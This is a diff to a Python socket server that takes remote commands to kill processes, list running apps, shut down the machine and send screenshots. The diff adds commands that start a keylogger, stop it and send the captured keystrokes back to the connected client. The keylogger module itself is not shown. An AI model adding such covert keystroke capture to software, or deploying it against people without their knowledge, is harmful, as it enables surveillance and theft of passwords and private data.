@@ -3,6 +3,8 @@ import threading
 import handleProcess 
 import handleRunningApp
 import controlOS
+import keylogger
+import config
 from sendScreenShot import sendScreenShot
 
 
@@ -27,12 +29,16 @@ def handleClientSocket(clientsocket):
                 handleProcess.killProcess(clientsocket, parameter) 
             elif flag == "listrunningapp" : handleRunningApp.listRunningApp(clientsocket)
             elif flag == "shutdown" : controlOS.shutdown()
+            elif flag == "hook": keylogger.startedKeyLogger()
+            elif flag == "unhook": config.hook = False 
+            elif flag == "sendkeylogger": keylogger.sendKeyLogger(clientsocket)
             else:
                 msg = 'Echo => '+ flag
                 clientsocket.send(msg.encode('ascii'))
         except:
             print("goodbye (err)") 
             break
+    config.init()
     clientsocket.close()
 
 def start_server():
